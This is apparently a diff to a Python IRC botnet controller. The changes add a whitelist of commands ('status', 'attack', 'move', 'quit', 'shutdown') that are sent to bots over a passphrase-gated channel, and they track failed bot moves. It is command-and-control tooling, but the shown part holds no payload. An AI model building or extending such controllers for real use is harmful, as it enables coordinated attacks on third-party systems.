@@ -6,13 +6,14 @@ import threading
 class conBot:
     
     def setup(self, host, port, channel, phrase):
+        self.acceptedComs = ["status", "attack", "move", "quit", "shutdown"]
         self.HOST = host
         self.PORT = int(port)
         self.CHANNEL = channel
         self.PHRASE = phrase
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # CONTROLLER INFO
-        self.conNick = "SLAVE_DRIVER73128"
+        self.conNick = "SLAVE_DRIVER738"
         self.liveConnection = False # Flag to see if controller connection to IRC Server is active
         self.command = None
 
@@ -89,6 +90,11 @@ class conBot:
             userCommand = input("command> ")
             self.command = userCommand.split()
 
+            if self.command[0] not in self.acceptedComs:
+                print("Incorrect Command Used")
+                print("Valid commands are: status, attack, move, quit, shutdown")
+                continue
+
             self.sendCommand("#" + self.CHANNEL, self.PHRASE)
 
             if (self.command[0] == "status"):
@@ -119,6 +125,7 @@ class conBot:
             elif (self.command[0] == "move"):
                 if(len(self.command) == 4):
                     self.botsMoved = []
+                    self.botsMoveFailed = []
                     self.sendCommand("#" + self.CHANNEL, userCommand)
                     time.sleep(5)
                     for bots in self.botsMoved:
